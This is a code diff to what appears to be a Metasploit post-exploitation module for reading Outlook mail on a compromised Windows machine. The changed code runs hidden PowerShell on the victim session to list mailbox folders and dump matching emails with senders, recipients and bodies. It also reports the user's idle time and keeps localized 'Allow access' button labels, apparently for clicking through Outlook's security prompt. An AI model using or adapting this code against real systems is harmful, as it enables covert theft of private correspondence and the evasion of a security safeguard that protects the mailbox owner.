@@ -4,14 +4,13 @@
 ##
 
 require 'msf/core'
-require 'iconv'
 
 class Metasploit3 < Msf::Post
-
   include Msf::Post::Windows::Registry
+  include Msf::Post::Windows::Powershell
 
         A_HASH = { "en_US" => "Allow", "NL" => "Toestaan", "de_DE" => "Erteilen", "de_AT" => "Erteilen" }
-        ACF_HASH = { "en_US" => "Allow access for", "NL" => "Toegang geven voor", "de_DE" => "Zugriff gewähren für", "de_AT" => "Zugriff gewähren für" }
+        ACF_HASH = { "en_US" => "Allow access for", "NL" => "Toegang geven voor", "de_DE" => "Zugriff gew\xc3\xa4hren f\xc3\xbcr", "de_AT" => "Zugriff gew\xc3\xa4hren f\xc3\xbcr" }
 
   def initialize(info={})
     super(update_info(info,
@@ -65,16 +64,14 @@ class Metasploit3 < Msf::Post
             }
         }
         $folders \| FT FolderPath
-    }    
+    }
     List-Folder
     |
-    utf16conv = Iconv.conv('UTF16LE', 'ASCII', psh_script)
-    encoded_psh = Rex::Text.encode_base64(utf16conv)
-    listBoxes_res = session.sys.process.execute("powershell.exe -enc #{encoded_psh}", nil, {'Hidden' => true, 'Channelized' => true})
-    sleep 3
-    print listBoxes_res.channel.read
-    listBoxes_res.channel.close
-    listBoxes_res.close
+    compressed_script = compress_script(psh_script)
+    cmd_out, runnings_pids, open_channels = execute_script(compressed_script)
+    while(d = cmd_out.channel.read)
+       print ("#{d}")
+    end
     currentidle = session.ui.idle_time
     print("\n")
     print_status("System has currently been idle for #{currentidle} seconds")
@@ -93,26 +90,23 @@ class Metasploit3 < Msf::Post
       $Namespace = $Outlook.GetNameSpace("MAPI")
       $account = $NameSpace.Folders
       $count = 0
-      try {
       foreach ($acc in $account) {
          $count = $count+1
+         try {
          $Email = $NameSpace.Folders.Item($count).Folders.Item($Folder).Items
-         $Email \| Where-Object {$_.$searchObject -like '*' + $searchTerm + '*'} \| Format-List To, SenderEmailAddress, CreationTime, TaskSubject, HTMLBody 
+         $Email \| Where-Object {$_.$searchObject -like '*' + $searchTerm + '*'} \| Format-List To, SenderEmailAddress, CreationTime, TaskSubject, HTMLBody
+         } catch {
+         Write-Host "Folder not found in mailbox $count"
          }
-       } catch {
-         Write-Host "The folder does not exist in the Outlook installation. Please fill in a correct foldername."
-       }
+        }
       }
       Get-Emails "#{keyword}" "#{folder}" "#{searchobject}"
     |
-    utf16conv = Iconv.conv('UTF16LE', 'ASCII', psh_script)
-    encoded_psh = Rex::Text.encode_base64(utf16conv)
-    readEmails_res = session.sys.process.execute("powershell.exe -enc #{encoded_psh}", nil, {'Hidden' => true, 'Channelized' => true})
-    while(d = readEmails_res.channel.read)
+    compressed_script = compress_script(psh_script)
+    cmd_out, runnings_pids, open_channels = execute_script(compressed_script, 120)
+    while(d = cmd_out.channel.read)
        print ("#{d}")
     end
-    readEmails_res.channel.close
-    readEmails_res.close
   end
 
   def clickButton(atrans,acftrans)
